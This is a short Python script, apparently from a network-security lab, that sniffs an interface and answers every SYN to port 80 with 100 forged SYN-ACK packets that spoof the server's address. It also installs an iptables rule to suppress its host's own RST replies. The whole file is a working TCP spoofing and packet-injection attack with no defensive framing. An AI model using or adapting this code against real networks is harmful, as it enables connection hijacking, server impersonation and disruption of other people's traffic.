#!/usr/bin/python
import pcapy
import dpkt
import random
from scapy.all import *
import sys
import os

dev = sys.argv[1]
conf.iface = dev

rule = "iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.56.50 -j DROP"
os.system(rule)


def send_synack(ip,tcp):
    ran_seq = random.randint(0,4294967295) # sequence number
    dst_ip = socket.inet_ntoa(ip.src)
    src_ip = socket.inet_ntoa(ip.dst)
    syn_ack = IP(dst=dst_ip,src=src_ip)/TCP(sport=tcp.dport,dport=tcp.sport,flags='SA',seq=ran_seq,ack=tcp.seq+1)
    for a in range(100):
        send(syn_ack,iface=dev)
        print "send to ",src_ip

def recv_packet(header, data):
    try:
        eth = dpkt.ethernet.Ethernet(data)
    except:
        return
    #IP Header
    if type(eth.data) == dpkt.ip.IP:
        ip = eth.data
        #TCP Header
        if type(ip.data) == dpkt.tcp.TCP:
            tcp = ip.data
            if tcp.flags == 2:
                print "SYN"
                if tcp.dport == 80:
                    send_synack(ip,tcp)

p = pcapy.open_live(dev, 65536, True, 100)
p.loop(-1, recv_packet)
#while(True):
#    (header,data) = p.next()
#    print header,data
